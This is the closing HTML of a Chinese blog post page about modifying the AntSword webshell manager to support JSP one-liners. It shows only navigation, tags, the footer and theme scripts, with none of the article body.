+    <button title="分享到 Mastodon"onclick="javascript:shareOnMastodon(&#34;蚁剑改造计划之实现JSP一句话&#34;, &#34;https://yzddmr6.com/posts/antsword-diy-3/&#34;)"><span class="fab fa-mastodon fa-fw"></span></button></div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"><i class="fas fa-tags fa-fw"></i>&nbsp;<a href="/tags/%E4%B8%AD%E5%9B%BD%E8%9A%81%E5%89%91/">中国蚁剑</a></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">返回</a></span>&nbsp;|&nbsp;<span><a href="/">主页</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav"><a href="/posts/antsword-diy-2/" class="prev" rel="prev" title="蚁剑改造计划之实现其他参数的随机化"><i class="fas fa-angle-left fa-fw"></i>蚁剑改造计划之实现其他参数的随机化</a>
+            <a href="/posts/antsword-diy-4/" class="next" rel="next" title="中国蚁剑源码分析">中国蚁剑源码分析<i class="fas fa-angle-right fa-fw"></i></a></div>
+</div>
+<div id="comments"><div id="utterances"></div><noscript>
+                Please enable JavaScript to view the comments powered by <a href="https://utteranc.es/">Utterances</a>.
+            </noscript></div></article></div>
+        </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line"><i class="far fa-copyright fa-fw"></i><span itemprop="copyrightYear">2019 - 2023</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="https://github.com/yzddmr6" target="_blank" rel="noopener noreferrer">yzddMr6</a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div>
+            <div class="footer-line"></div>
+            <div class="footer-line">
+            </div>
+        </div></footer></div>
+
+    <div id="fixed-buttons"><a href="#back-to-top" id="back-to-top-button" class="fixed-button" title="回到顶部">
+            <i class="fas fa-arrow-up fa-fw"></i>
+        </a><a href="#" id="view-comments" class="fixed-button" title="查看评论">
+            <i class="fas fa-comment fa-fw"></i>
+        </a>
+    </div><div class="assets"><script type="text/javascript">window.config={"code":{"copyTitle":"复制到剪贴板","maxShownLines":10},"comment":{"utterances":{"darkTheme":"github-dark","issueTerm":"pathname","label":"","lightTheme":"github-light","repo":"Hugo-DoIt/utterances-comments"}},"search":{"algoliaAppID":"5YGRNRQK1G","algoliaIndex":"zh_cn_index","algoliaSearchKey":"0ff6874805de24b84aa1d5ebccad56cd","highlightTag":"em","maxResultLength":10,"noResultsFound":"没有找到结果","snippetLength":50,"type":"algolia"},"sharerjs":true,"table":{"sort":true}};</script><script type="text/javascript" src="/lib/tablesort/tablesort.min.js"></script><script type="text/javascript" src="/lib/clipboard/clipboard.min.js"></script><script type="text/javascript" src="/lib/sharer/sharer.min.js"></script><script type="text/javascript" src="/js/theme.min.js" defer></script><script type="text/javascript" src="/js/utterances.min.js" defer></script></div>
+</body>
+
+</html>
